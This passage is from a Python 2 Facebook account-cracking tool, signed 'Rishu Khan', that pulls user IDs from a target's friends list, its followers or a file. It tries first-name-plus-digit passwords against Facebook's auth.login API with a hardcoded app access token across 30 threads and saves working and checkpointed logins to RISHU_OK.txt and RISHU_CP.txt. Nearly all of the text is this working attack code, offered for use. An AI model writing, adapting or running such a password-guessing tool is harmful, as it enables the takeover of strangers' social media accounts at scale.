                            ok = open('RISHU_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('RISHU_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass5 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                            q = json.loads(data)
                            if 'access_token' in q:
                                print '\x1b[1;9m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('RISHU_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                cp = open('RISHU_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass6 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                q = json.loads(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('RISHU_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    cp = open('RISHU_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass7 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                    q = json.loads(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('RISHU_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        cp = open('RISHU_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass8 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                                        q = json.loads(data)
                                        if 'access_token' in q:
                                            print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('RISHU_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error_msg']:
                                            print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            cp = open('RISHU_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\033[1;97m-------------------------------------------------")
    print("\033[1;97m[!] The cloning process has been completed")
    print '\x1b[1;92mTotal \x1b[1;92mOk\x1b[1;97m/\x1b[1;93mCp :\x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cps))
    print '\x1b[1;97mTotal \x1b[1;92mOk :\x1b[1;92m' + str(len(oks))
    print '\x1b[1;97mTotal \x1b[1;93mCp :\x1b[1;93m' + str(len(cps))
    print("\033[1;97m-------------------------------------------------")
    raw_input(' \x1b[1;97mPress enter to back\x1b[1;97m')
    brand_menu()


def dolfan_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t \033[1;97mLogin FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
    print('\033[1;97m-------------------------------------------------')
    print '\x1b[1;97m[\033[1;92m1\033[1;97m] Public id cloning'
    print '\x1b[1;97m[\033[1;92m2\033[1;97m] Followers cloning'
    print '\x1b[1;97m[\033[1;92m4\033[1;97m] File cloning'
    print '\x1b[1;97m[\033[1;92m0\033[1;97m] Back\x1b[1;97m'
    print('\033[1;97m-------------------------------------------------')
    dlfn_s()


def dlfn_s():
    id = []
    cps = []
    oks = []
    dol_s = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Choose : \033[1;92m')
    if dol_s == '1':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97mFor example:123,1234,12345,786,12,1122\x1b[1;97m'
        print('\033[1;97m-------------------------------------------------')
        p1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Name + digit : \033[1;92m')
        p2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Name + digit : \033[1;92m')
        p3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Name + digit : \033[1;92m')
        p4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Name + digit : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t\033[1;91m Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;97mPress enter to try again \x1b[1;97m')
            dolfan_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif dol_s == '2':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print ' \x1b[1;97mFor example:123,1234,12345,786,12,1122\x1b[1;97m'
        print('\033[1;97m-------------------------------------------------')
        p1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Name + digit : \033[1;92m')
        p2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Name + digit : \033[1;92m')
        p3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Name + digit : \033[1;92m')
        p4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Name + digit : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        idt = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] Enter id : \x1b[0;92m')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print('[\033[1;91m\033[1;47m-----------------CLONING START-----------------\033[0m]\033[0;97m')
            print('\033[1;97m-------------------------------------------------')
            print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Cloning from : \033[1;92m' + z
        except (KeyError, IOError):
            print '\t \033[1;91mInvalid user \x1b[0;97m'
            raw_input('\x1b[1;97mPress enter to try again \x1b[1;97m')
            dolfan_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif dol_s == '3':
        os.system('clear')
        print logo
        print("[\033[1;91m\033[1;47m-------------NAME + DIGITS PASSWORD------------\033[0m]\033[1;37m")
        print('\033[1;97m-------------------------------------------------')
        print '\x1b[1;97mFor example:123,1234,12345,786,12,1122\x1b[1;97m'
        print('\033[1;97m-------------------------------------------------')
        p1 = raw_input('\x1b[1;97m[\033[1;92m1\033[1;97m] Name + digit : \033[1;92m')
        p2 = raw_input('\x1b[1;97m[\033[1;92m2\033[1;97m] Name + digit : \033[1;92m')
        p3 = raw_input('\x1b[1;97m[\033[1;92m3\033[1;97m] Name + digit : \033[1;92m')
        p4 = raw_input('\x1b[1;97m[\033[1;92m4\033[1;97m] Name + digit : \033[1;92m')
        print('\033[1;97m-------------------------------------------------')
        try:
            idlist = raw_input('\x1b[1;97m[\033[1;92m?\033[1;97m] File Name : \x1b[0;92m')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '\033[1;91m[!] File Not Found.'
            raw_input('\x1b[1;97mPress Enter To Back. \x1b[1;97m')
            dolfan_crack()

    elif dol_s == '0':
        menu()
    else:
        print ''
        print '\x1b[1;31mChoose valid option'
        dlfn_s()
    print '\x1b[1;97m[\033[1;92m✓\033[1;97m] Total ids : \033[1;92m' + str(len(id))
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("\033[1;97m[!] Plz Wait Clone Account Will Be Appear Here")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')
    print("      Use flight Airplane Mode Before Use")
    time.sleep(0.5)
    print('\033[1;97m-------------------------------------------------')

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        biran = random.choice(birth)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower() + p1
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('RISHU_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('RISHU_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + p2
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('RISHU_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('RISHU_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + p3
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('RISHU_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        cp = open('RISHU_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + p4
                        data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass4 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                        q = json.loads(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[RISHU-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('RISHU_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;33m[RISHU-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            cp = open('RISHU_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print("\033[1;97m-------------------------------------------------")
    print("\033[1;97m[!] The cloning process has been completed")
    print '\x1b[1;92mTotal \x1b[1;92mOk\x1b[1;97m/\x1b[1;93mCp :\x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cps))
    print '\x1b[1;97mTotal \x1b[1;92mOk :\x1b[1;92m' + str(len(oks))
    print '\x1b[1;97mTotal \x1b[1;93mCp :\x1b[1;93m' + str(len(cps))
    print("\033[1;97m-------------------------------------------------")
    raw_input(' \x1b[1;97mPress enter to back\x1b[1;97m')
    brand_menu()


reload(sys)
sys.setdefaultencoding('utf-8')

def juttex_menu():
    os.system('clear')
    try:
        __cindy__ = open('access_token.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()

    try:
        osjaoaosnsi = requests.get('https://graph.facebook.com/me?access_token=%s' % __cindy__)
        jaoanzjwowj = json.loads(osjaoaosnsi.text)
        nama = jaoanzjwowj['name']
        idfb = jaoanzjwowj['id']
    except KeyError:
        os.system('clear')
        print '\n %s[%s!%s] token/cookies invalid' % (N, M, N)
        time.sleep(1)
        os.system('rm -rf access_token.txt')
        log_menu()
    except requests.exceptions.ConnectionError:
        print '\n\n %s[%s!%s] tidak ada koneksi\n' % (N, M, N)
        exit()

if __name__ == '__main__':
	os.system("clear")
	jalan("\033[1;91m Script By Rishu Khan" )
	time.sleep(2)
	main_menu()